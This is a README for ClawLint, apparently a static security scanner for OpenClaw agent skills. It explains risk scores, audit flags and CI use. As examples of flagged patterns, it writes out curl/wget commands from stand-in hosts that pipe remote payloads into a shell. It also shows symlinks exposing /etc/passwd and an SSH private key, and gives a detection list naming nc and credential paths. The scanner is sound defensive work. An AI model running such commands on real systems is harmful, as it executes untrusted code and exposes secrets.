---
name: claw-lint
description: Security scanner for OpenClaw skills. Detects malware and backdoors before execution, scores risk levels, and monitors file integrity through static code analysis.
---

# ClawLint

**Security linter for OpenClaw skills**

Runs a local audit over your installed OpenClaw skills without executing any code. Scans both workspace (`~/.openclaw/workspace/skills`) and system (`~/.openclaw/skills`) directories.

With 7.1% of ClawHub skills containing security flaws, ClawLint provides pre-execution defense by identifying malicious patterns before they run.

# Summary
ClawLint audits OpenClaw skills for security threats without executing code. It detects malicious patterns like remote execution, credential theft, and backdoors, then assigns risk scores (0-100) and generates SHA256 hashes for integrity monitoring. Outputs JSON for automation and CI/CD pipelines.

---

## What It Does

- **Risk scoring** — assigns a numeric risk score (0-100) based on detected patterns
- **Audit flags** — identifies suspicious behaviors (remote execution, secret access, etc.)
- **Inventory mode** — optional SHA256 hashing of all files for change detection
- **JSON output** — machine-readable results (requires Python 3)
- **No execution** — static analysis only, safe to run on untrusted skills

---

## Quick Start

### Scan all skills (summary view)
```bash
{baseDir}/bin/claw-lint.sh
```

### Scan one specific skill
```bash
{baseDir}/bin/claw-lint.sh --skill <skill-name>
```
Example: `{baseDir}/bin/claw-lint.sh --skill hashnode-publisher`

### Full inventory with SHA256 hashes
```bash
{baseDir}/bin/claw-lint.sh --full --skill <skill-name>
```

### JSON output (requires Python 3)
```bash
{baseDir}/bin/claw-lint.sh --format json
```

---

## Options

| Flag | Description |
|------|-------------|
| `--skill <name>` | Scan only the specified skill |
| `--full` | Include SHA256 inventory of all files |
| `--format json` | Output as JSON (needs python3) |
| `--min-score <N>` | Show only skills with risk score ≥ N |
| `--strict` | Prioritize high-severity patterns |
| `--max-bytes <N>` | Skip files larger than N bytes (default: 2MB) |

---

## Understanding the Output

### Risk Score

- **0-30**: Low risk (common patterns, minimal concerns)
- **31-60**: Medium risk (network access, file operations)
- **61-100**: High risk (remote execution, credential access, system tampering)

### Common Flags

- `pipes_remote_to_shell` — downloads and executes remote code
- `downloads_remote_content` — fetches external files
- `has_executables` — contains binary files
- `uses_ssh_or_scp` — SSH/SCP operations
- `contains_symlinks` — symbolic links present

---

## Example Output

```text
SCORE  SKILL                FILES  SIZE     FLAGS
-----  -----                -----  ----     -----
57     hashnode-publisher   2      1.1KB    downloads_remote_content,pipes_remote_to_shell
45     ec2-health-monitor   2      1.9KB    pipes_remote_to_shell
```

---

## Risk Scoring Details

ClawLint assigns risk scores from **0 (safe) to 100 (critical)** based on pattern detection:

| Score Range | Classification | Description |
|-------------|---------------|-------------|
| 0-20 | Low Risk | Standard file operations, no suspicious patterns |
| 21-50 | Medium Risk | Network calls or external dependencies detected |
| 51-80 | High Risk | Multiple suspicious patterns or obfuscation detected |
| 81-100 | Critical | Remote execution, secret access, or privilege escalation |

### Scoring Factors

- **+25 points**: Remote execution patterns (curl \| bash, wget -O-, nc)
- **+30 points**: Secret/credential access (~/.openclaw/credentials, ~/.ssh/)
- **+20 points**: Privilege escalation (sudo, setuid, chmod +s)
- **+15 points**: Code obfuscation (base64 decode, eval, exec in suspicious contexts)
- **+10 points**: External network calls (curl, wget, http requests)
- **+10 points**: File system operations outside skill directory
- **+5 points**: Use of /tmp or world-writable directories

---

## Audit Flags Explained

### pipes_remote_to_shell
Downloads and executes external code without verification.

**Examples:**
```bash
curl https://evil.com/script.sh | bash
wget -O- https://malicious.site/payload | sh
```

**Risk:** Critical. Remote code execution vector for malware.

### downloads_remote_content
Fetches external files or data from the internet.

**Examples:**
```bash
curl -O https://example.com/file.tar.gz
wget https://cdn.example.com/data.json
```

**Risk:** Medium-High. Potential supply chain attack or data exfiltration.

### has_executables
Contains compiled binary files (not shell scripts).

**Examples:**
- ELF binaries
- Compiled programs

**Risk:** Medium. Harder to audit, may contain hidden functionality.

### uses_ssh_or_scp
Performs SSH/SCP operations.

**Examples:**
```bash
ssh user@remote.host "command"
scp file.txt user@remote:/path/
```

**Risk:** Medium. Potential for unauthorized remote access or data transfer.

### contains_symlinks
Includes symbolic links that may point outside skill directory.

**Examples:**
```bash
ln -s /etc/passwd exposed_file
ln -s ~/.ssh/id_rsa key_link
```

**Risk:** Low-Medium. May expose sensitive files or create confusion.

---

## Requirements

- Bash 4.0+
- Standard Unix tools: `find`, `grep`, `awk`, `sha256sum`, `stat`
- Python 3 (optional, for JSON output only)

Works on Ubuntu/Debian without sudo. Designed for EC2 and similar environments.

---

## Why Use This?

- Audit skills before installation
- Detect backdoors or malicious patterns in community skills
- Track changes to installed skills with SHA256 inventory
- Enforce security policies in automated pipelines

---

## Output Formats

### Terminal Output (Default)

Human-readable table format with color-coded risk scores (when terminal supports colors).

### JSON Output (--format json)

Machine-readable structure for integration with CI/CD pipelines:

```json
{
  "scan_date": "2026-02-13T14:50:00Z",
  "skills_scanned": 12,
  "high_risk_count": 2,
  "results": [
    {
      "skill_name": "hashnode-publisher",
      "risk_score": 57,
      "file_count": 2,
      "total_size": "1.1KB",
      "flags": ["downloads_remote_content", "pipes_remote_to_shell"],
      "files": [
        {
          "path": "bin/publish.sh",
          "sha256": "a1b2c3d4...",
          "size": 896
        }
      ]
    }
  ]
}
```

---

## Best Practices

### Regular Audits

Run ClawLint after installing or updating skills:

```bash
{baseDir}/bin/claw-lint.sh --min-score 50
```

### Baseline Inventory

Create a security baseline for production environments:

```bash
{baseDir}/bin/claw-lint.sh --full --format json > baseline.json
```

Re-run periodically and diff against baseline to detect tampering.

### CI/CD Integration

Add to your deployment pipeline:

```bash
# Fail build if any skill scores above 60
{baseDir}/bin/claw-lint.sh --format json | python3 -c "
import json, sys
data = json.load(sys.stdin)
high_risk = [s for s in data['results'] if s['risk_score'] > 60]
if high_risk:
    print(f'❌ {len(high_risk)} high-risk skills detected')
    sys.exit(1)
"
```

### Whitelist Trusted Skills

For known-safe skills with legitimate flags, document exceptions:

```bash
# Example: hashnode-publisher needs network access
{baseDir}/bin/claw-lint.sh --skill hashnode-publisher
# Expected score: 45-60 (downloads_remote_content is legitimate)
```

---

## Limitations

- **Static analysis only** — cannot detect runtime behavior or dynamically generated code
- **Pattern-based** — may have false positives for legitimate use cases
- **No sandbox** — does not execute or test skills
- **Local files only** — scans installed skills, not ClawHub packages before install

For comprehensive security, combine ClawLint with:
- Manual code review for critical skills
- VirusTotal scanning for executables
- Runtime monitoring and sandboxing
- Regular security updates

---

## Contributing

Report false positives or suggest new detection patterns at the OpenClaw security repository.

---

## License

MIT License - Free to use, modify, and distribute.
